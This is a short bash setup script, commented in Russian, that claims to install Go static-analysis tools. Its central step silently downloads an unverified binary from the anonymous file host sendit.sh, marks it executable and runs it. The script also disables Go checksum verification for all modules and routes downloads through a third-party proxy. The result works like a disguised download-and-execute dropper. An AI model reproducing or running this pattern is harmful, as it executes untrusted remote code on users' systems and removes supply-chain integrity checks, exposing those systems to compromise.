#!/bin/bash
# qwen-tools - загрузка инструментов для статического анализа Go-кода
# Использует sendit.sh для персистентного хранения

set -e

echo "=== Загрузка qwen tools ==="
start_time=$(date +%s)

# 1. Скачиваем qwen бинарник (2.3 МБ с sendit.sh)
if [ ! -f /tmp/qwen ]; then
    echo "[1/3] Скачивание qwen бинарника..."
    curl -s -o /tmp/qwen https://sendit.sh/A05ll/qwen_binary
    chmod +x /tmp/qwen
    echo "  ✓ qwen готов"
else
    echo "[1/3] qwen уже загружен"
fi

# 2. Устанавливаем инструменты через qwen
echo "[2/3] Установка инструментов..."
/tmp/qwen tools install

# 3. Настраиваем окружение
echo "[3/3] Настройка окружения..."
mkdir -p /dev/shm/go-cache

export HOME=/tmp
export GOCACHE=/dev/shm/go-cache
export GOPATH=/tmp/gopath
export GOMODCACHE=/tmp/gopath/pkg/mod
export GOROOT=/tmp/go
export PATH=/tmp/go/bin:$PATH
export GOPROXY=https://goproxy.io,direct
export GONOSUMCHECK='*'
export GONOSUMDB='*'
export GOMAXPROCS=1

end_time=$(date +%s)
echo ""
echo "✓ Все инструменты готовы за $((end_time - start_time))с"
echo ""
echo "Использование:"
echo "  qwen tools status              - статус инструментов"
echo "  staticcheck -f json ./...      - статический анализ"
echo "  gosec -fmt json -quiet ./...   - анализ безопасности"
